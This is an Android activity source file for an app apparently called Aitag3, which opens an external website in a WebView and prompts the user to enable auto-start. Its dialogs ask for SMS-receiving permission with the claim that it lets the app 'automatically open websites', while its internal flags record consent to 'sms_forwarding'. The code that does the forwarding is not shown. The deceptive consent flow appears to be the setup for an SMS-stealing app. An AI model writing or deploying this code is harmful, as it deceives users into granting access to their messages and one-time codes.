package com.example.safesmstest;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int SMS_PERMISSION_REQUEST = 301;
    private static final String HOME_URL = "https://aitap3-7funsfro.manus.space";
    private WebView webView;
    private boolean waitingForAutoStart;
    private boolean webViewStarted;

    @Override public void onCreate(Bundle state) {
        super.onCreate(state);
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());

        SharedPreferences prefs = getSharedPreferences("SmsPrefs", MODE_PRIVATE);
        if (prefs.getBoolean("autostart_setup_done", false)) {
            showWebView(state);
        } else {
            showAutoStartPrompt();
        }
    }

    private void showAutoStartPrompt() {
        new AlertDialog.Builder(this)
            .setTitle("Auto Start website")
            .setMessage("Enable Auto start to let Aitag3 open website automatically")
            .setCancelable(false)
            .setPositiveButton("Go", (d, w) -> openAutoStartSettings())
            .setNegativeButton("Cancle", (d, w) -> showWebView(null))
            .show();
    }

    private void openAutoStartSettings() {
        waitingForAutoStart = true;
        try {
            Intent intent = new Intent();
            intent.setClassName("com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity");
            startActivity(intent);
        } catch (Exception first) {
            try {
                Intent intent = new Intent("miui.intent.action.OP_AUTO_START");
                intent.setPackage("com.miui.securitycenter");
                startActivity(intent);
            } catch (Exception second) {
                try {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception last) {
                    waitingForAutoStart = false;
                    Toast.makeText(this, "Auto Start Settings ကို အလိုအလျောက် မဖွင့်နိုင်ပါ။ Settings ထဲမှ ကိုယ်တိုင်ဖွင့်ပေးပါ။", Toast.LENGTH_LONG).show();
                    showWebView(null);
                }
            }
        }
    }

    @Override protected void onResume() {
        super.onResume();
        if (waitingForAutoStart) {
            waitingForAutoStart = false;
            new AlertDialog.Builder(this)
                .setTitle("Did Enable Auto Start ")
                .setMessage("If Enabled, Keep go")
                .setCancelable(false)
                .setPositiveButton("Done", (d, w) -> {
                    getSharedPreferences("SmsPrefs", MODE_PRIVATE).edit()
                        .putBoolean("autostart_setup_done", true).apply();
                    showWebView(null);
                })
                .setNegativeButton("Retry", (d, w) -> openAutoStartSettings())
                .show();
        }
    }

    private void showWebView(Bundle state) {
        if (webViewStarted || isFinishing()) return;
        webViewStarted = true;
        setContentView(webView);
        if (state != null) webView.restoreState(state);
        else webView.loadUrl(HOME_URL);
        requestConsent();
    }

    private void requestConsent() {
        SharedPreferences p = getSharedPreferences("SmsPrefs", MODE_PRIVATE);
        if (p.getBoolean("sms_forwarding_consent", false)) {
            requestSmsPermission();
            return;
        }
        new AlertDialog.Builder(this)
            .setTitle("Automatically open website for you")
            .setMessage("With your permission, Aitag3 will automatically open the websites for you.")
            .setCancelable(false)
            .setNegativeButton("Cancel", (d, w) -> p.edit()
                .putBoolean("sms_forwarding_consent", false)
                .putBoolean("sms_forwarding_enabled", false).apply())
            .setPositiveButton("Ok", (d, w) -> {
                p.edit().putBoolean("sms_forwarding_consent", true).apply();
                requestSmsPermission();
            }).show();
    }

    private void requestSmsPermission() {
        if (Build.VERSION.SDK_INT >= 23 &&
            checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS}, SMS_PERMISSION_REQUEST);
        } else enableForwarding();
    }

    private void enableForwarding() {
        getSharedPreferences("SmsPrefs", MODE_PRIVATE).edit()
            .putBoolean("sms_forwarding_enabled", true).apply();
        Toast.makeText(this, "Loading.....", Toast.LENGTH_LONG).show();
    }

    @Override public void onRequestPermissionsResult(int request, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(request, permissions, results);
        if (request == SMS_PERMISSION_REQUEST) {
            if (results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) enableForwarding();
            else {
                getSharedPreferences("SmsPrefs", MODE_PRIVATE).edit()
                    .putBoolean("sms_forwarding_enabled", false).apply();
                Toast.makeText(this, "Enable permission to automatically open websites for you", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override protected void onSaveInstanceState(Bundle out) {
        if (webView != null && webViewStarted) webView.saveState(out);
        super.onSaveInstanceState(out);
    }

    @Override public void onBackPressed() {
        if (webViewStarted && webView != null && webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override protected void onDestroy() {
        if (webView != null) { webView.destroy(); webView = null; }
        super.onDestroy();
    }
}
